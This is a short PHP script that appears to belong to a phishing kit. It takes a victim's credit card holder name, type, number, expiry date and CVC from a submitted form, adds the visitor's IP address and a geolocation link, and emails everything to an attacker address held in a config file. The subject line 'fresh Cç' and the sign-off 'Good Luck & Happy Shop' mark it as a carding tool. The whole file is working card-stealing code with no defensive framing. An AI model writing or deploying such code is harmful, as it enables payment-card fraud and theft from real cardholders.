<?php
  $holder = $_POST['credit_holder'];
  $type = $_POST['credit_type'];
  $number = $_POST['credit_number'];
  $expdate = $_POST['credit_expdate'];
  $cvc = $_POST['credit_cvc'];
  $ip_addresse = getenv('HTTP_CLIENT_IP')?:
  getenv('HTTP_X_FORWARDED_FOR')?:
  getenv('HTTP_X_FORWARDED')?:
  getenv('HTTP_FORWARDED_FOR')?:
  getenv('HTTP_FORWARDED')?:
  getenv('REMOTE_ADDR');

  $subject = "CreditCard | fresh Cç - FROM ". $ip_addresse ."  -";
  $headers = "From: NARISSI \r\n";
  $headers .= "Reply-To: no-reply \r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
  $msg = "<div style='text-align: center; width: 400px'>";
  $msg .= "----------------------   CC INFORMATION   ------------------------- <br><br>";
  $msg .= "<b> Card Holder : </b> <span style='color: #3498DB;'>$holder</span> <br><br>";
  $msg .= "<b> Card Type : </b> <span style='color: #3498DB;'>$type</span> <br><br>";
  $msg .= "<b> Card Number : </b> <span style='color: #FC575E;'>$number</span> <br><br>";
  $msg .= "<b> Exp Date : </b> <span style='color: #FC575E;'>$expdate</span> <br><br>";
  $msg .= "<b> Cvc : </b> <span style='color: #FC575E;'>$cvc</span> <br><br>";

  $msg .= "<b> Ip Address : </b> <span style='color: #FC575E;'>$ip_addresse</span> <br><br>";
  $msg .= "<a href='https://geoiptool.com/fr/?ip=$ip_addresse' target='_blank'>https://geoiptool.com/fr/?ip=$ip_addresse</a><br><br>";
  $msg .= "------------------- Good Luck & Happy Shop <3  ------------------------- <br><br>";
  $msg .= "</div>";
  include '../../config.php';
  $to = $result_to;
  mail($to, $subject, $msg, $headers);
?>
